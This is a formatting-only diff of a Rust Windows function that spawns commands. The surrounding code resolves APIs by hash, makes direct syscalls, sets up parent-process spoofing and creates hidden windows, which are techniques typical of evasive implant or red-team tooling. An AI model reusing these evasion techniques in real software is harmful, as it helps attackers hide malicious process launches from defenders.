@@ -7,14 +7,14 @@ pub fn execute_command(
     args: &[&str],
     capture_output: bool,
 ) -> Result<std::process::Output> {
+    use crate::win_types::HANDLE;
+    use crate::win_types::PROCESS_INFORMATION;
     use std::ffi::c_void;
     use std::os::windows::ffi::OsStrExt;
-    use crate::win_types::PROCESS_INFORMATION;
     use windows_sys::Win32::System::Threading::CREATE_NO_WINDOW;
     use windows_sys::Win32::System::Threading::EXTENDED_STARTUPINFO_PRESENT;
-    use windows_sys::Win32::System::Threading::STARTUPINFOEXW;
-    use crate::win_types::HANDLE;
     use windows_sys::Win32::System::Threading::PROCESS_CREATE_PROCESS;
+    use windows_sys::Win32::System::Threading::STARTUPINFOEXW;
     const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
     use windows_sys::Win32::System::Threading::STARTF_USESTDHANDLES;
 
@@ -87,10 +87,10 @@ pub fn execute_command(
             pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreatePipe\0"))
                 .ok_or_else(|| anyhow::anyhow!("could not resolve CreatePipe"))?;
         type CreatePipeFn = unsafe extern "system" fn(
-            *mut HANDLE,                                      // hReadPipe
-            *mut HANDLE,                                      // hWritePipe
+            *mut HANDLE,                                // hReadPipe
+            *mut HANDLE,                                // hWritePipe
             *mut crate::win_types::SECURITY_ATTRIBUTES, // lpPipeAttributes
-            u32,                                              // nSize
+            u32,                                        // nSize
         ) -> i32; // BOOL
         let create_pipe: CreatePipeFn = std::mem::transmute(create_pipe_addr);
 
@@ -99,16 +99,16 @@ pub fn execute_command(
             pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreateProcessW\0"))
                 .ok_or_else(|| anyhow::anyhow!("could not resolve CreateProcessW"))?;
         type CreateProcessWFn = unsafe extern "system" fn(
-            *mut u16,                                         // lpApplicationName
-            *mut u16,                                         // lpCommandLine
-            *mut c_void,                                      // lpProcessAttributes
-            *mut c_void,                                      // lpThreadAttributes
-            i32,                                              // bInheritHandles
-            u32,                                              // dwCreationFlags
-            *mut c_void,                                      // lpEnvironment
-            *mut u16,                                         // lpCurrentDirectory
+            *mut u16,                            // lpApplicationName
+            *mut u16,                            // lpCommandLine
+            *mut c_void,                         // lpProcessAttributes
+            *mut c_void,                         // lpThreadAttributes
+            i32,                                 // bInheritHandles
+            u32,                                 // dwCreationFlags
+            *mut c_void,                         // lpEnvironment
+            *mut u16,                            // lpCurrentDirectory
             *mut crate::win_types::STARTUPINFOW, // lpStartupInfo
-            *mut PROCESS_INFORMATION,                         // lpProcessInformation
+            *mut PROCESS_INFORMATION,            // lpProcessInformation
         ) -> i32; // BOOL
         let create_process_w: CreateProcessWFn = std::mem::transmute(create_process_w_addr);
 
@@ -144,8 +144,7 @@ pub fn execute_command(
         let mut p_handle_raw: usize = 0;
         if parent_pid != std::process::id() {
             let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
-            obj_attr.Length =
-                std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
+            obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
             let mut client_id = [0u64; 2];
             client_id[0] = parent_pid as u64;
             let status = crate::syscall!(
@@ -218,8 +217,7 @@ pub fn execute_command(
 
         if capture_output {
             let mut sec_attr: crate::win_types::SECURITY_ATTRIBUTES = std::mem::zeroed();
-            sec_attr.nLength =
-                std::mem::size_of::<crate::win_types::SECURITY_ATTRIBUTES>() as u32;
+            sec_attr.nLength = std::mem::size_of::<crate::win_types::SECURITY_ATTRIBUTES>() as u32;
             sec_attr.bInheritHandle = 1; // TRUE
 
             if create_pipe(&mut stdout_rd, &mut stdout_wr, &mut sec_attr, 0) != 0 {
